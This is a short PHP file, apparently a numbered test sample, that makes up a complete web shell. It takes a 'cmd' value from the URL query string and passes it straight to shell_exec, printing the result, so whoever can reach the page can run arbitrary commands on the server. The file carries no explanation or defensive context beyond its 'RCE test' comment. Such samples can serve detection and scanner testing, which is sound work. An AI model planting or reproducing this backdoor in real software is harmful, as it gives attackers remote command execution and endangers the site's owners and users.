<?php
// RCE test variation #792
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>